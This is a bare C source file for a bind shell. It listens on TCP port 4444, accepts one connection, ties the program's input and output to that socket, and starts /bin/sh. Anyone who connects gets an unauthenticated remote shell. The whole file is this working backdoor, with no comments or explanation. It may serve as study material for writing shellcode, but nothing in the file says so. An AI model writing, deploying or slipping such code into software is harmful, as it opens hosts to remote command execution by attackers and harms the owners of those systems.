#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
 
int main(void)
{
        int clientfd, sockfd;
        int dstport = 4444;
        struct sockaddr_in mysockaddr;
 
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
        mysockaddr.sin_family = AF_INET;
        mysockaddr.sin_port = htons(dstport);
        mysockaddr.sin_addr.s_addr = INADDR_ANY;
 
        bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
 
        listen(sockfd, 0);
 
        clientfd = accept(sockfd, NULL, NULL);
 
        dup2(clientfd, 0);
        dup2(clientfd, 1);
        dup2(clientfd, 2);
 
        execve("/bin/sh", NULL, NULL);
        return 0;
}